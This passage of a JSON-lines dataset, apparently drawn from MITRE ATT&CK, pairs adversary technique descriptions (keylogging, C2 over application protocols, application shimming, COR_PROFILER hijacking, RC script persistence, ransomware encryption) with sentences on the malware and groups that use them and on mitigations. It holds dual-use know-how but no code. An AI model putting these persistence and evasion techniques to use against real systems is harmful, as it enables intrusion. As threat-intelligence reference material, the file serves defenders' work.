Accelerators.", "QakBot can capture keystrokes on a compromised host.", "TajMahal has the ability to capture keystrokes on an infected host.", "ADVSTORESHELL can perform keylogging.", "Catchamas collects keystrokes from the victim’s machine.", "Operation Wocao has obtained the password for the victim's password manager via a custom keylogger.", "XAgentOSX contains keylogging functionality that will monitor for active application windows and write them to the log, it can handle special characters, and it will buffer by default 50 characters before sending them out over the C2 infrastructure.", "Metamorfo has a command to launch a keylogger and capture keystrokes on the victim’s machine. ", "Trojan.Karagany can capture keystrokes on a compromised host.", "Derusbi is capable of logging keystrokes.", "Cuba logs keystrokes via polling by using <code>GetKeyState</code> and <code>VkKeyScan</code> functions.", "MarkiRAT can capture all keystrokes on a compromised host.", "Remexi gathers and exfiltrates keystrokes from the machine.", "Ke3chang has used keyloggers.", "Sowbug has used keylogging tools.", "One of Attor's plugins can collect user credentials via capturing keystrokes and can capture keystrokes pressed within the window of the injected process.", "NetTraveler contains a keylogger.", "Rover has keylogging functionality.", "ROKRAT uses a keylogger to capture keystrokes and location of where the user is typing.", "ECCENTRICBANDWAGON can capture and store keystrokes.", "PoetRAT has used a Python tool named klog.exe for keylogging.", "Matryoshka is capable of keylogging.", "TinyZBot contains keylogger functionality.", "The executable version of Helminth has a module to log keystrokes.", "Grandoreiro can log keystrokes on the victim's machine.", "CosmicDuke uses a keylogger.", "Bandook contains keylogging capabilities.", "MoonWind has a keylogger.", "Remcos has a command for keylogging.", "Revenge RAT has a plugin for keylogging.", "Dtrack’s dropper contains a keylogging executable.", "APT3 has used a keylogging tool that records keystrokes in encrypted files.", "KONNI has the capability to perform keylogging.", "ZxShell has a feature to capture a remote computer's keystrokes using a keylogger. ", "Malware used by Group5 is capable of capturing keystrokes.", "Regin contains a keylogger.", "BISCUIT can capture keystrokes.", "Prikormka contains a keylogger module that collects keystrokes and the titles of foreground windows.", "Daserf can log keystrokes.", "RTM can record keystrokes from both the keyboard and virtual keyboard.", "Fysbis can perform keylogging. ", "Duqu can track key presses with a keylogger module.", "PlugX has a module for capturing keystrokes per process including window titles.", "Darkhotel has used a keylogger.", "Cobalt Strike can track key presses with a keylogger module.", "Kivars has the ability to initiate keylogging on the infected host.", "MacSpy captures keystrokes.", "Proton uses a keylogger to capture keystrokes.", "Peppy can log keystrokes on compromised hosts.", "Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function.\t", "EvilGrab has the capability to capture keystrokes.", "FakeM contains a keylogger module.", "VERMIN collects keystrokes from the victim machine.", "Empire includes keylogging capabilities for Windows, Linux, and macOS systems.", "APT39 has used tools for capturing keystrokes.", "Tonto Team has used keylogging tools in their operations.", "Crimson can use a module to perform keylogging on compromised hosts.", "njRAT is capable of logging keystrokes.", "DarkComet has a keylogging capability.", "Explosive has leveraged its keylogging capabilities to gain access to administrator accounts on target servers. ", "Cobian RAT has a feature to perform keylogging on the victim’s machine.", "KeyBoy installs a keylogger for intercepting credentials and keystrokes.", "Imminent Monitor has a keylogging module.", "HTTPBrowser is capable of capturing keystrokes on victims.", "Agent Tesla can log keystrokes on the victim’s machine.", "gh0st RAT has a keylogger.", "CHOPSTICK is capable of performing keylogging.", "Lazarus Group malware KiloAlfa contains keylogging functionality.", "NavRAT logs the keystrokes on the targeted system.", "Cardinal RAT can log keystrokes.", "Okrum was seen using a keylogger tool to capture keystrokes. ", "GreyEnergy has a module to harvest pressed keystrokes.", "PoshC2 has modules for keystroke logging and capturing credentials from spoofed Outlook authentication messages.", "APT28 has used tools to perform keylogging.", "Kasidet has the ability to initiate keylogging.", "jRAT has the capability to log keystrokes from the victim’s machine, both offline and online.", "PLATINUM has used several different keyloggers.", "OwaAuth captures and DES-encrypts credentials before writing the username and password to a log file, <code>C:\\log.txt</code>.", "Zeus Panda can perform keylogging on the victim’s machine by hooking the functions TranslateMessage and WM_KEYDOWN.", "Remsec contains a keylogger component.", "Threat Group-3390 actors installed a credential logger on Microsoft Exchange servers. Threat Group-3390 also leveraged the reconnaissance framework, ScanBox, to capture keystrokes."], "is_subtechnique": true}
{"text": " Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.", "idx": "https://attack.mitre.org/techniques/T1071", "title": "Application Layer Protocol", "entity": "Application Layer Protocol", "entity_type": "techniques", "entity_context": ["Siloscape connects to an IRC server for C2.", "TeamTNT has used an IRC bot for C2 communications.", "Duqu uses a custom command and control protocol that communicates over commonly used ports, and is frequently encapsulated by application layer protocols.", "Lucifer can use the Stratum protocol on port 10001 for communication between the cryptojacking bot and the mining server.", "The Regin malware platform supports many standard protocols, including SMB.", "Dragonfly 2.0 used SMB for C2.", "Magic Hound malware has used IRC for C2.", "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level.", "Cobalt Strike can conduct peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.", "Hildegard has used an IRC channel for C2 communications.", "Rocke issued wget requests from infected systems to the C2.", "Adversaries can also use NETEAGLE to establish an RDP connection with a controller over TCP/7519."], "is_subtechnique": false}
{"text": " Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014) An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS). To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets. Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This", "idx": "https://attack.mitre.org/techniques/T1499", "title": "Endpoint Denial of Service", "entity": "Endpoint Denial of Service", "entity_type": "techniques", "entity_context": ["ZxShell has a feature to perform SYN flood attack on a host. ", "OnionDuke has the capability to use a Denial of Service module.", "Sandworm Team temporarily disrupted service to Georgian government, non-government, and private sector websites after compromising a Georgian web hosting provider in 2019.", "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."], "is_subtechnique": false}
{"text": " Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. (Citation: Elastic Process Injection July 2017) Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in: * <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and * <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code> Custom databases are stored in: * <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and * <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code> To keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress). Utilizing these shims may allow an adversary to perform several malicious acts such", "idx": "https://attack.mitre.org/techniques/T1546/011", "title": "Application Shimming", "entity": "Application Shimming", "entity_type": "techniques", "entity_context": ["Changing UAC settings to \"Always Notify\" will give the user more visibility when UAC elevation is requested, however, this option will not be popular among users due to the constant UAC interruptions.", "Microsoft released an optional patch update - KB3045645 - that will remove the \"auto-elevate\" flag within the sdbinst.exe. This will prevent use of application shimming to bypass UAC.", "FIN7 has used application shim databases for persistence.", "SDBbot has the ability to use application shimming for persistence if it detects it is running as admin on Windows XP or 7, by creating a shim database to patch services.exe.", "Pillowmint has used a malicious shim database to maintain persistence.", "ShimRat has installed shim databases in the <code>AppPatch</code> folder."], "is_subtechnique": true}
{"text": " Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices could include the motherboard, hard drive, or video cards.", "idx": "https://attack.mitre.org/techniques/T1495", "title": "Firmware Corruption", "entity": "Firmware Corruption", "entity_type": "techniques", "entity_context": ["TrickBot module \"Trickboot\" can write or erase the UEFI/BIOS firmware of a compromised device.", "Prevent adversary access to privileged accounts or access necessary to replace system firmware.", "Bad Rabbit has used an executable that installs a modified bootloader to prevent normal boot-up.", "Patch the BIOS and other firmware as necessary to prevent successful use of known vulnerabilities.", "Check the integrity of the existing BIOS and device firmware to determine if it is vulnerable to modification."], "is_subtechnique": false}
{"text": " Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.(Citation: Microsoft Profiling Mar 2017)(Citation: Microsoft COR_PROFILER Feb 2013) The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.(Citation: Microsoft COR_PROFILER Feb 2013) Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)) if the victim .NET process executes at a higher permission level, as well as to hook and [Impair Defenses](https://attack.mitre.org/techniques/T1562) provided by .NET processes.(Citation: RedCanary Mockingbird May 2020)(Citation: Red Canary COR_PROFILER May 2020)(Citation: Almond COR_PROFILER Apr 2019)(Citation: GitHub OmerYa Invisi-Shell)(Citation: subTee .NET Profilers May 2017)", "idx": "https://attack.mitre.org/techniques/T1574/012", "title": "COR_PROFILER", "entity": "COR_PROFILER", "entity_type": "techniques", "entity_context": ["Ensure proper permissions are set for Registry hives to prevent users from modifying keys associated with COR_PROFILER.", "Limit the privileges of user accounts so that only authorized administrators can edit system environment variables.", "Identify and block potentially malicious unmanaged COR_PROFILER profiling DLLs  by using application control solutions like AppLocker that are capable of auditing and/or blocking unapproved DLLs.", "Blue Mockingbird has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR."], "is_subtechnique": true}
{"text": " Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems. A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.", "idx": "https://attack.mitre.org/techniques/T1027/005", "title": "Indicator Removal from Tools", "entity": "Indicator Removal from Tools", "entity_type": "techniques", "entity_context": ["PowerSploit's <code>Find-AVSignature</code> AntivirusBypass module can be used to locate single byte anti-virus signatures.", "Waterbear can scramble functions not to be executed again with random values.", "InvisiMole has undergone regular technical improvements in an attempt to evade detection.", "GALLIUM ensured each payload had a unique hash, including by using different types of packers.", "Operation Wocao has edited variable names within the Impacket suite to avoid automated detection.", "Patchwork apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes.", "Based on comparison of Gazer versions, Turla made an effort to obfuscate strings in the malware that could be used as IoCs, including the mutex name and named pipe.", "APT3 has been known to remove indicators of compromise from tools.", "The author of GravityRAT submitted samples to VirusTotal for testing, showing that the author modified the code to try to hide the DDE object in a different part of the document.", "QakBot can make small changes to itself in order to change its checksum and hash value.", "TEMP.Veles has modified files based on the open-source project cryptcat in an apparent attempt to decrease AV detection rates.", "Cobalt Strike includes a capability to modify the Beacon payload to eliminate known signatures or unpacking methods.", "SUNBURST source code used generic variable names and pre-obfuscated strings, and was likely sanitized of developer comments before being added to SUNSPOT. ", "Analysis of Daserf has shown that it regularly undergoes technical improvements to evade anti-virus detection.", "Deep Panda has updated and modified its malware, resulting in different hash values that evade detection.", "Penquin can remove strings from binaries.", "OilRig has tested malware samples to determine AV detection and subsequently modified the samples to ensure AV evasion."], "is_subtechnique": true}
{"text": " Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.(Citation: Docker API)(Citation: Kubernetes API) An adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.(Citation: Unit 42 Unsecured Docker Daemons) An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components.", "idx": "https://attack.mitre.org/techniques/T1552/007", "title": "Container API", "entity": "Container API", "entity_type": "techniques", "entity_context": ["Use the principle of least privilege for privileged accounts such as the service account in Kubernetes.", "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls.", "Limit communications with the container service to local Unix sockets or remote access via SSH. Require secure port access to communicate with the APIs over TLS by disabling unauthenticated access to the Docker API and Kubernetes API Server."], "is_subtechnique": true}
{"text": " Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.(Citation: Petri Logon Script AD) These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems. Adversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.", "idx": "https://attack.mitre.org/techniques/T1037/003", "title": "Network Logon Script", "entity": "Network Logon Script", "entity_type": "techniques", "entity_context": ["Restrict write access to logon scripts to specific administrators."], "is_subtechnique": true}
{"text": " Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004). Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity.(Citation: Expel IO Evil in AWS) Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.", "idx": "https://attack.mitre.org/techniques/T1562/007", "title": "Disable or Modify Cloud Firewall", "entity": "Disable or Modify Cloud Firewall", "entity_type": "techniques", "entity_context": ["Ensure least privilege principles are applied to Identity and Access Management (IAM) security policies.", "Routinely check account role permissions to ensure only expected users and roles have permission to modify cloud firewalls. "], "is_subtechnique": true}
{"text": " Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.", "idx": "https://attack.mitre.org/techniques/T1505/002", "title": "Transport Agent", "entity": "Transport Agent", "entity_type": "techniques", "entity_context": ["Regularly check component software on critical services that adversaries may target for persistence to verify the integrity of the systems and identify if unexpected changes have been made. ", "LightNeuron has used a malicious Microsoft Exchange transport agent for persistence.", "Do not allow administrator accounts that have permissions to add component software on these services to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems. ", "Ensure all application component binaries are signed by the correct application developers. "], "is_subtechnique": true}
{"text": " Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service. Adversaries may commandeer these sessions to carry out actions on remote systems. [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it hijacks an existing session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH Hijack)", "idx": "https://attack.mitre.org/techniques/T1563", "title": "Remote Service Session Hijacking", "entity": "Remote Service Session Hijacking", "entity_type": "techniques", "entity_context": ["Disable the remote service (ex: SSH, RDP, etc.) if it is unnecessary.", "Limit remote user permissions if remote access is necessary.", "Do not allow remote access to services as a privileged account unless necessary.", "Enable firewall rules to block unnecessary traffic between network security zones within a network."], "is_subtechnique": false}
{"text": " Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify. Adversaries can establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence. Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.(Citation: intezer-kaiji-malware) Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004). (Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)", "idx": "https://attack.mitre.org/techniques/T1037/004", "title": "RC Scripts", "entity": "RC Scripts", "entity_type": "techniques", "entity_context": ["HiddenWasp installs reboot persistence by adding itself to <code>/etc/rc.local</code>.", "Limit privileges of user accounts so only authorized users can edit the rc.common file.", "iKitten adds an entry to the rc.common file for persistence."], "is_subtechnique": true}
{"text": " Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.(Citation: DigiCert Install SSL Cert) Adversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. Adversaries can obtain digital certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) or create self-signed certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1587/003)). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).", "idx": "https://attack.mitre.org/techniques/T1608/003", "title": "Install Digital Certificate", "entity": "Install Digital Certificate", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."], "is_subtechnique": true}
{"text": " Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges</code> API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges. Adversaries may abuse <code>AuthorizationExecuteWithPrivileges</code> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)", "idx": "https://attack.mitre.org/techniques/T1548/004", "title": "Elevated Execution with Prompt", "entity": "Elevated Execution with Prompt", "entity_type": "techniques", "entity_context": ["System settings can prevent applications from running that haven't been downloaded through the Apple Store which may help mitigate some of these issues. Not allowing unsigned applications from being run may also mitigate some risk.", "OSX/Shlayer can escalate privileges to root by asking the user for credentials."], "is_subtechnique": true}
{"text": " Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the system’s policies.(Citation: PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) into a user’s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) then [User Execution](https://attack.mitre.org/techniques/T1204). For example, an executable file attachment named <code>Evil.txt.exe</code> may display as <code>Evil.txt</code> to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.(Citation: SOCPrime DoubleExtension) Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.", "idx": "https://attack.mitre.org/techniques/T1036/007", "title": "Double File Extension", "entity": "Double File Extension", "entity_type": "techniques", "entity_context": ["Mustang Panda has used an additional filename extension to hide the true file type.", "Disable the default to “hide file extensions for known file types” in Windows OS.", "The Bazar loader has used dual-extension executable files such as PreviewReport.DOC.exe.", "Train users to look for double extensions in filenames, and in general use training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events."], "is_subtechnique": true}
{"text": " Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018) In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) In cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1)", "idx": "https://attack.mitre.org/techniques/T1486", "title": "Data Encrypted for Impact", "entity": "Data Encrypted for Impact", "entity_type": "techniques", "entity_context": ["APT38 has used Hermes ransomware to encrypt files with AES256.", "ProLock can encrypt files on a compromised host with RC6, and encrypts the key with RSA-1024.", "Avaddon encrypts the victim system using a combination of AES256 and RSA encryption schemes.", "Conti can use <code>CreateIoCompletionPort()</code>, <code>PostQueuedCompletionStatus()</code>, and <code>GetQueuedCompletionPort()</code> to rapidly encrypt files, excluding those with the extensions of .exe, .dll, and .lnk. It has used a different AES-256 encryption key per file with a bundled RAS-4096 public encryption key that is unique for each victim. Conti can use “Windows Restart Manager” to ensure files are unlocked and open for encryption.", "XCSSET performs AES-CBC encryption on files under <code>~/Documents</code>, <code>~/Downloads</code>, and\n<code>~/Desktop</code> with a fixed key and renames files to give them a <code>.enc</code> extension. Only files with sizes \nless than 500MB are encrypted.", "ThiefQuest encrypts a set of file extensions on a host, deletes the original files, and provides a ransom note with no contact information.", "SamSam encrypts victim files using RSA-2048 encryption and demands a ransom be paid in Bitcoin to decrypt those files.", "RobbinHood will search for an RSA encryption key and then perform its encryption process on the system files. ", "JCry has encrypted files and demanded Bitcoin to decrypt those files. ", "TA505 has used a wide variety of ransomware, such as Locky, Jaff, Bart, Philadelphia, and GlobeImposter, to encrypt victim files and demand a ransom payment.", "Maze has disrupted systems by encrypting files on targeted machines, claiming to decrypt files if a ransom payment is made. Maze has used the ChaCha algorithm, based on Salsa20, and an RSA algorithm to encrypt files.", "Netwalker can encrypt files on infected machines to extort victims.\t", "WastedLocker can encrypt data and leave a ransom note. ", "Seth-Locker can encrypt files on a targeted system, appending them with the suffix .seth.", "Pysa has used RSA and AES-CBC encryption algorithm to encrypt a list of targeted file extensions. ", "Babuk can use ChaCha8 and ECDH to encrypt data.", "Clop can encrypt files using AES, RSA, and RC4 and will add the \".clop\" extension to encrypted files. ", "Xbash has maliciously encrypted victim's database systems and demanded a cryptocurrency ransom be paid.", "FIVEHANDS can use an embedded NTRU public key to encrypt data for ransom.", "Cuba has the ability to encrypt system data and add the \".cuba\" extension to encrypted files. ", "Ryuk has used a combination of symmetric (AES) and asymmetric (RSA) encryption to encrypt files. Files have been encrypted with their own AES key and given a file extension of .RYK. Encrypted directories have had a ransom note of RyukReadMe.txt written to the directory.", "Ragnar Locker encrypts files on the local machine and mapped drives prior to displaying a note demanding a ransom.", "FIN7 has encrypted virtual disk volumes on ESXi servers using a version of Darkside ransomware.", "Consider implementing IT disaster recovery plans that contain procedures for regularly taking and testing data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery. Consider enabling versioning in cloud environments to maintain backup copies of storage objects.", "DEATHRANSOM can use public and private key pair encryption to encrypt files for ransom payment.", "APT41 used a ransomware called Encryptor RaaS to encrypt files on the targeted systems and provide a ransom note to the user.", "KillDisk has a ransomware component that encrypts files with an AES key that is also RSA-1028 encrypted.", "REvil can encrypt files on victim systems and demands a ransom to decrypt the files.", "Indrik Spider has encrypted domain-controlled systems using BitPaymer.", "HELLOKITTY can use an embedded RSA-2048 public key to encrypt victim data for ransom.", "On Windows 10, enable cloud-delivered protection and Attack Surface Reduction (ASR) rules to block the execution of files that resemble ransomware. ", "Shamoon has an operational mode for encrypting data instead of overwriting it.", "WannaCry encrypts user files and demands that a ransom be paid in Bitcoin to decrypt those files.", "EKANS uses standard encryption library functions to encrypt files.", "LockerGoga has encrypted files, including core Windows OS files, using RSA-OAEP MGF1 and then demanded Bitcoin be paid for the decryption key.", "SynAck encrypts the victims machine followed by asking the victim to pay a ransom. ", "Egregor can encrypt all non-system files using a hybrid AES-RSA algorithm prior to displaying a ransom note. ", "BitPaymer can import a hard-coded RSA 1024-bit public key, generate a 128-bit RC4 key for each file, and encrypt the file in place, appending <code>.locked</code> to the filename.", "Bad Rabbit has encrypted files and disks using AES-128-CBC and RSA-2048.", "MegaCortex has used the open-source library, Mbed Crypto, and generated AES keys to carry out the file encryption process.", "NotPetya encrypts user files and disk structures like the MBR with 2048-bit RSA.", "Pay2Key can encrypt data on victim's machines using RSA and AES algorithms in order to extort a ransom payment for decryption."], "is_subtechnique": false}
